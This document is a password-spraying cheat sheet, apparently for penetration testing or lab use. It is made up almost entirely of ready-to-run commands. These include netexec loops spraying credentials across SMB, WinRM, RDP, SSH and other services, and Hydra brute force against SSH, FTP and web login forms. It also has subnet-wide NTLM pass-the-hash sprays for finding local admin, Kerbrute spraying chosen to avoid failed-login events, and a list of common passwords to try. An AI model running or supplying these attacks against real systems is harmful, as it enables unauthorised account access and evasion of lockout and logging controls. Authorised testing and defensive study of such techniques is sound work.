# Password Spraying Reference

> **Core rule:** Always check the password policy before spraying.
> `netexec smb $DC_IP -u user -p pass --pass-pol`
> Know the lockout threshold. Never exceed it minus two per account.

---

## PRIORITY SCENARIOS

### Scenario 1 — I have a password, I have a list of usernames

```bash
# Spray across all key services in one go
for proto in smb winrm rdp mssql ssh ftp ldap; do
  echo "=== $proto ===" && \
  netexec $proto $IP -u users.txt -p 'FoundPassword!' \
    -d corp.local --continue-on-success 2>/dev/null | grep "[+]"
done

# Or subnet-wide (finds every machine where it lands)
for proto in smb winrm rdp; do
  echo "=== $proto ===" && \
  netexec $proto 10.10.10.0/24 -u users.txt -p 'FoundPassword!' \
    -d corp.local --continue-on-success 2>/dev/null | grep "[+]"
done
```

---

### Scenario 2 — I have a username, I have a list of passwords

```bash
# Test one user against a password list across all services
for proto in smb winrm rdp mssql ssh ftp ldap; do
  echo "=== $proto ===" && \
  netexec $proto $IP -u username -p passwords.txt \
    -d corp.local --continue-on-success 2>/dev/null | grep "[+]"
done

# Hydra for services netexec doesn't cover well (HTTP, SMTP, POP3)
hydra -l username -P passwords.txt $IP ssh -t 4
hydra -l username -P passwords.txt $IP ftp -t 4
hydra -l username -P passwords.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 10
```

---

### Scenario 3 — I have a list of usernames AND a list of passwords

```bash
# Pair each user with each password across all services (full matrix)
for proto in smb winrm rdp mssql ssh ftp ldap; do
  echo "=== $proto ===" && \
  netexec $proto $IP -u users.txt -p passwords.txt \
    -d corp.local --continue-on-success 2>/dev/null | grep "[+]"
done

# If users.txt and passwords.txt are matched line-for-line (user1:pass1, user2:pass2)
# use --no-bruteforce to pair them 1:1 instead of full matrix
netexec smb $IP -u users.txt -p passwords.txt \
  --no-bruteforce -d corp.local --continue-on-success | grep "[+]"

# Test username = password for every user (very common in labs)
netexec smb $IP -u users.txt -p users.txt \
  --no-bruteforce -d corp.local --continue-on-success | grep "[+]"
```

---

## HASH SCENARIOS

### I have an NTLM hash — spray it everywhere

```bash
# Subnet-wide hash spray — Pwn3d! means local admin
netexec smb 10.10.10.0/24 -u administrator -H 'NTLMhash' \
  --local-auth --continue-on-success | grep "[+]"

# Domain account hash
netexec smb 10.10.10.0/24 -u administrator -H 'NTLMhash' \
  -d corp.local --continue-on-success | grep "[+]"

# Test WinRM specifically (Pwn3d! = evil-winrm shell available)
netexec winrm 10.10.10.0/24 -u administrator -H 'NTLMhash' \
  --continue-on-success | grep "[+]"
```

---

## AD-SPECIFIC SPRAYING

### Kerbrute — safest option (no failed login events for wrong passwords)

```bash
# Spray one password against all users via Kerberos (port 88)
kerbrute passwordspray -d corp.local --dc $DC_IP users.txt 'Password123!'

# User enumeration first, then spray confirmed valid users only
kerbrute userenum -d corp.local --dc $DC_IP \
  /usr/share/seclists/Usernames/Names/names.txt \
  | grep "VALID" | awk '{print $7}' | cut -d@ -f1 > valid_users.txt

kerbrute passwordspray -d corp.local --dc $DC_IP valid_users.txt 'Password123!'
```

---

## OUTPUT & FILTERING

```bash
# Save everything, only show hits in terminal
netexec smb 10.10.10.0/24 -u users.txt -p passwords.txt \
  -d corp.local --continue-on-success \
  | tee spray_results.txt | grep "[+]"

# Pull just the IPs where a hash worked
netexec smb 10.10.10.0/24 -u admin -H NTLMhash --local-auth \
  --continue-on-success | grep "Pwn3d!" | awk '{print $2}'

# netexec colour key:
# [+] = valid credentials
# [-] = invalid
# [*] = info / no auth required
# Pwn3d! = local admin confirmed
```

---

## FLAG REFERENCE

| Flag | Meaning |
|---|---|
| `--continue-on-success` | Don't stop at first hit — always include this |
| `--no-bruteforce` | Pair users.txt and passwords.txt line-for-line (1:1 match) |
| `--local-auth` | Test local account not domain account (for hash spraying) |
| `-d corp.local` | Specify domain — always include in AD environments |
| `| grep "[+]"` | Filter to successes only — saves scrolling through failures |

---

## COMMON PASSWORDS TO TRY FIRST

```
Season + year:    Summer2024!  Winter2024!  Spring2024!
Welcome:          Welcome1  Welcome123!  Welcome2024!
Password:         Password1  Password123!  P@ssword1
Company name:     run cewl against the web app first
Username as pass: test with --no-bruteforce (users.txt against itself)
Blank password:   always try — especially sa, guest, anonymous, admin
```
